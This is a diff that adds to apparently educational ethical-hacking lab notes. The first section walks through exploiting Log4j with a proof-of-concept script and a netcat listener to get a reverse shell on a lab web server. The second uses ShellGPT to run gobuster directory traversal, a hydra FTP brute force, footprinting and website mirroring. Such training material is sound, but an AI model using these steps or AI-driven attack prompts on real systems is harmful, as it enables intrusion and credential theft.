@@ -1984,9 +1984,110 @@ It’s basically a wrapper around the OpenAI API.
   - open target mechine and open c:\ftp
   - switch back to parrot machine and help and it will show all commands
   - quit
-  - This concludes the demonstration of how to crack FTP credentials using a dictionary attack and gain remote access to the FTP server         
+  - This concludes the demonstration of how to crack FTP credentials using a dictionary attack and gain remote access to the FTP server
 
-
+* Gain Access to Target Web Server by Exploiting Log4j Vulnerability :~
+  - open ubantu and open the terminal and type sudo su for root user
+  - for update type this command
+    - sudo apt-get update
+  - we want to install the docker command is
+    ```console
+          sudo apt-get install docker.io
+    ```
+  - docker is successfully completed installation enter this command to redirect the directory
+    - cd log4j-shell-poc/ 
+  - we need to setup log4j vulnerable server to type command
+    ```command
+          docker build -t log4j-shell-poc . (. full stop also important)
+    ```
+  - to start the vulnerable server type command
+    ```command
+          docker run --network host log4j-shell-poc
+    ```
+  - Leave the server running in the Ubuntu machine
+  - open parrot machine and sudo su for root user
+  - We will first scan the target machine to identify any vulnerable services running on it so use command
+    ```console
+          nmap -sV -sC 10.10.1.9
+    ```
+    - 10.10.1.9 = its a target ip address
+  - rom the result we can see that port 8080 is open and Apache Tomcat/Coyote 1.1 server is running on the target system
+  - Upon investigation we can see that Apache is vulnerable to Remote Code Execution (RCE) attack
+  - to view the RCE vulnerabilities on the Apache server
+    - searchsploit -t Apache RCE
+  - Now, we need to select a vulnerability to exploit the Server from the list, from the Nmap scan we found that the Apache Tomcat server is running on JSP so we will target java vulnerabilities from the list of vulnerabilities
+  - We can see that Java platform is vulnerable for Apache Log4j 2 - Remote Command Execution (RCE) exploit
+  - We will now exploit Log4j vulnerability present in the target Web Server to perform Remote code execution
+  - Click the Firefox icon and In the address bar of the browser, type 
+    ```console
+          http://10.10.1.9:8080
+    ```      
+  - As we can observe that the Log4j vulnerable server is running on the Ubuntu machine
+  - for log4j-shell-poc directory type 
+    ```console
+          cd log4j-shell-poc/
+    ```
+  - we needed to install JDK 8, to do that open a new terminal window and type sudo su
+  - We need to extract JDK zip file and type to extract the file
+    ```console
+          tar -xf jdk-8u202-linux-x64.tar.gz
+    ```
+  - Now we will move the jdk1.8.0_202 into /usr/bin/. To do that, type
+    ```console
+          mv jdk1.8.0_202 /usr/bin/
+    ```
+  - we need to update the installed JDK path in the poc.py file so Navigate to the previous terminal window. In the terminal, type pluma poc.py 
+  - In the poc.py file scroll down and in line 62, replace 
+    - jdk1.8.0_20/bin/javac --> /usr/bin/jdk1.8.0_202/bin/javac
+  - scroll down to line 87 and replace
+    - jdk1.8.0_20/bin/java --> /usr/bin/jdk1.8.0_202/bin/java
+  - Scroll down to line 99 and replace
+    - jdk1.8.0_20/bin/java --> /usr/bin/jdk1.8.0_202/bin/java
+  - After making all the changes save the changes and close the poc.py
+  - open a new terminal window and type 
+    - nc -lvp 9001                                                   
+  - Switch to previous terminal window and type and press Enter, to start the exploitation and create payload
+    ```console
+          python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
+    ```
+  - copy the payload generated in the send me: section
+  - Switch to Firefox browser window, in Username field paste the payload that was copied in previous step and in Password field type password and press Login
+  - Now switch to the netcat listener, you can see that a reverse shell is opened
+  - In the listener window type pwd  and whoami
+  - The Log4j vulnerability takes the payload as input and processes it, as a result we will obtain a reverse shell
 </details>
 
+<details>
+<summary>Perform a Web Server Hacking using AI</summary>
+
+* Perform Web Server Footprinting and Attacks using ShellGPT :~
+  - open the parrot machine and open the terminal and activate the sgpt using AI acr=tivation key
+  - using bash sgpt.sh we can activate sgpt using AI activation key
+  - To perform directory traversal using ShellGPT, run
+    ```console
+          sgpt --shell "Perform a directory traversal on target url https://certifiedhacker.com using gobuster
+    ```
+  - To perform FTP bruteforce attack run
+    ```console
+          sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists" 
+    ```
+  - To perform webserver footprinting on target IP address using ShellGPT, run
+    ```console
+          sgpt --shell "Perform webserver footprinting on target IP 10.10.1.22"
+    ```
+  - to perform web server footprinting using netcat
+    ```console
+          sgpt --shell "Perform web server footprinting on target IP 10.10.1.22 using Netcat by sending an HTTP request and analyzing the response."
+    ```
+  - To perform website mirroring using ShellGPT, run
+    ```console
+          sgpt --shell "Mirror the target website certifiedhacker.com"
+    ```
+  - Alternatively you can use Httrack to mirror a target website, to do so run
+    ```console
+          sgpt --shell "Mirror the target website https://certifiedhacker.com with httrack on desktop"
+    ```
+  - To view the mirrored website navigate to Places -> Home Folder -> certifiedhacker.com location and double-click on index.html file
+  - The mirrored certifiedhacker.com website opens up in Firefox browser
+</details>
 
